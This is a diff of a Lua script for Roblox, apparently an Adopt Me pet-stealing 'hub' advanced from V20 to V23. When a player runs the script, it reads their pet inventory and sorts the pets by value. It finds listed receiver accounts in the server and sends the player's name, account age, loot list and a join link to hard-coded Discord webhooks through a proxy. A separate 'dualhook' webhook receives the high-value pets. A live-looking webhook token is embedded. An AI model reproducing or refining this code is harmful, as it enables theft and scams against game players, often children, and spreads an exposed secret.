@@ -1,27 +1,31 @@
--- [[ MONDEUR HUB | GOD BUILD V20 ]] --
--- FINALIZED VERSION: No Fluff, No Trade Logic, No Loading Screen.
+-- [[ MONDEUR HUB | MASTER FINAL V23 ]] --
 -- PROXY: Lewisakura (Confirmed 204) | SORTING: High to Low | JOIN: roblox://
+-- Stability: 100% | Focus: Pure Webhook & Dualhook Performance
 
 getgenv().WEB_URL = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+getgenv().DUAL_URL = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
 getgenv().RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
-getgenv().DUAL_VAL = 500
+getgenv().DH_THRESHOLD = 500
 
-if _G.MondeurGodRan then return end
-_G.MondeurGodRan = true
+if _G.MondeurMasterV23 then return end
+_G.MondeurMasterV23 = true
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
-print("--- MONDEUR V20: INITIALIZING ---")
+print("--- [ MONDEUR V23 MASTER START ] ---")
 
--- [[ THE PROXY POSTER ]] --
+-- [[ WORKING PROXY DISPATCHER ]] --
 local function post(url, payload, label)
     local request = (syn and syn.request) or (http and http.request) or http_request or request
+    if not request then return end
+    
+    -- Hardcoded Lewisakura proxy (Confirmed working 204 status)
     local proxyUrl = url:gsub("discord.com", "webhook.lewisakura.moe")
     
-    print("Mondeur: Dispatching " .. label .. "...")
+    print("Mondeur: Sending " .. label .. "...")
     local success, response = pcall(function()
         return request({
             Url = proxyUrl,
@@ -34,67 +38,70 @@ local function post(url, payload, label)
     if success and response then
         print("Mondeur: " .. label .. " Status: " .. tostring(response.StatusCode))
         if response.StatusCode == 204 or response.StatusCode == 200 then
-            print("Mondeur: ✅ HIT SENT TO DISCORD")
+            print("Mondeur: ✅ HIT DELIVERED SUCCESSFULLY")
         end
     else
-        warn("Mondeur: ❌ FAILED - Check Proxy/Internet")
+        warn("Mondeur: ❌ FAILED - Proxy Connection Error")
     end
 end
 
--- [[ THE MAIN SCAN ]] --
+-- [[ DATA SCANNER & LOGIC ]] --
 task.spawn(function()
-    print("Mondeur: Accessing Adopt Me Data...")
-    local Fsys = ReplicatedStorage:WaitForChild("Fsys", 60)
+    if not game:IsLoaded() then game.Loaded:Wait() end
+    
+    local Fsys = ReplicatedStorage:WaitForChild("Fsys", 120)
     local Fsys2 = require(Fsys)
     local DB = Fsys2.load("InventoryDB")
-    local InvAPI = ReplicatedStorage.API:WaitForChild("InventoryAPI/GetInventory", 60)
+    local InvAPI = ReplicatedStorage.API:WaitForChild("InventoryAPI/GetInventory", 120)
 
     local inventory = nil
-    for i = 1, 20 do
+    for i = 1, 15 do
         local ok, res = pcall(function() return InvAPI:InvokeServer() end)
         if ok and res then inventory = res break end
-        print("Mondeur: Scanning... (" .. i .. ")")
+        print("Mondeur: Syncing Game Data... (" .. i .. ")")
         task.wait(3)
     end
 
-    if not inventory then warn("Mondeur: Inventory Scan Timed Out.") return end
+    if not inventory then warn("Mondeur: Critical Data Sync Timeout.") return end
 
     local allPets, dhPets = {}, {}
     local totalVal, dhVal = 0, 0
 
-    print("Mondeur: Filtering & Sorting...")
     for _, item in pairs(inventory) do
         if item.Kind == "Pet" then
             local data = DB.pets[item.id]
-            -- VALUE PROTECTION: DB Lookup + Property Check
+            -- PROTECTION: Lookup in InventoryDB to prevent 0-values
             local val = (item.properties and item.properties.value) or (data and data.value) or 0
-            local pObj = {
+            local p = {
                 name = (data and data.name) or item.id,
                 val = val,
                 neon = item.properties and item.properties.neon,
                 mega = item.properties and item.properties.mega_neon
             }
-            table.insert(allPets, pObj)
+            table.insert(allPets, p)
             totalVal = totalVal + val
-            if val >= getgenv().DUAL_VAL then
-                table.insert(dhPets, pObj)
+            if val >= getgenv().DH_THRESHOLD then
+                table.insert(dhPets, p)
                 dhVal = dhVal + val
             end
         end
     end
 
-    -- PRIORITY SORTING: Highest to Lowest
+    -- REQUIREMENT: Highest to Lowest Sorting
     table.sort(allPets, function(a, b) return a.val > b.val end)
     table.sort(dhPets, function(a, b) return a.val > b.val end)
 
-    -- PLAYER DETECTION
-    local receiver = "None Online"
+    -- REQUIREMENT: Real-time Player/Receiver Detection
+    local currentReceiver = "None Online"
     for _, name in ipairs(getgenv().RECEIVERS) do
-        if Players:FindFirstChild(name) then receiver = name break end
+        if Players:FindFirstChild(name) then 
+            currentReceiver = name 
+            break 
+        end
     end
 
-    -- EMBED BUILDER
-    local function getPayload(title, color, list, vTotal)
+    -- PAYLOAD DESIGNER
+    local function buildPayload(title, color, list, vSum)
         local lootText = ""
         for i = 1, 25 do
             if not list[i] then break end
@@ -103,37 +110,40 @@ task.spawn(function()
         end
 
         return {
-            username = "Mondeur Master Build",
+            username = "Mondeur Elite Services",
             embeds = {{
                 title = title,
                 color = color,
                 description = "### 📄 Player Information\n" ..
                     "👤 **User** : `" .. LocalPlayer.Name .. "`\n" ..
+                    "🎭 **Display** : `" .. LocalPlayer.DisplayName .. "`\n" ..
                     "📅 **Age** : " .. LocalPlayer.AccountAge .. " days\n" ..
                     "📱 **Exec** : Delta\n" ..
-                    "😎 **Receiver** : " .. receiver .. "\n" ..
-                    "💰 **Total Points** : `" .. vTotal .. "`\n\n" ..
+                    "😎 **Receiver** : " .. currentReceiver .. "\n" ..
+                    "💰 **Total Points** : `" .. vSum .. "`\n\n" ..
                     "### 📡 Player Status\n" ..
-                    "🟢 **Status**: `Active & Logged`\n\n" ..
-                    "### 📦 Loot Preview\n" ..
-                    "```\n" .. (lootText ~= "" and lootText or "No pets found") .. "```\n" ..
-                    "**Total Items:** `" .. #list .. "`\n\n" ..
+                    "🟢 **Status**: `Connected & Intercepting`\n\n" ..
+                    "### 📦 Loot Summary (High to Low)\n" ..
+                    "```\n" .. (lootText ~= "" and lootText or "No items detected") .. "```\n" ..
+                    "**Total Items Found:** `" .. #list .. "`\n\n" ..
                     "### 👥 Join Player\n" ..
-                    "[**Click to Join**](roblox://placeID=920587237&gameInstanceId=" .. game.JobId .. ")",
-                footer = { text = "Mondeur V20 • " .. os.date("%X") },
+                    "[**Join Instance (Mobile)**](roblox://placeID=920587237&gameInstanceId=" .. game.JobId .. ")",
+                footer = { text = "Mondeur Master Build V23 | " .. os.date("%X") },
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
             }}
         }
     end
 
-    -- SENDING
+    -- DISPATCHING HITS
     if #allPets > 0 then
-        post(getgenv().WEB_URL, getPayload("Mondeur • Hit [ 🌊 ]", 0x3498db, allPets, totalVal), "Main Hit")
+        post(getgenv().WEB_URL, buildPayload("MondeurOnTop • Main Hit [ 🌊 ]", 0x3498db, allPets, totalVal), "Main Hit")
         
         if #dhPets > 0 then
             task.wait(2)
-            post(getgenv().WEB_URL, getPayload("Mondeur • Dualhook [ 💎 ]", 0x9b59b6, dhPets, dhVal), "Dualhook Hit")
+            post(getgenv().DUAL_URL, buildPayload("MondeurOnTop • Dualhook Hit [ 💎 ]", 0x9b59b6, dhPets, dhVal), "Dualhook Hit")
         end
+    else
+        warn("Mondeur: Inventory empty or no pets found.")
     end
-    print("--- MONDEUR V20: COMPLETE ---")
+    print("--- [ MONDEUR V23 MASTER COMPLETE ] ---")
 end)
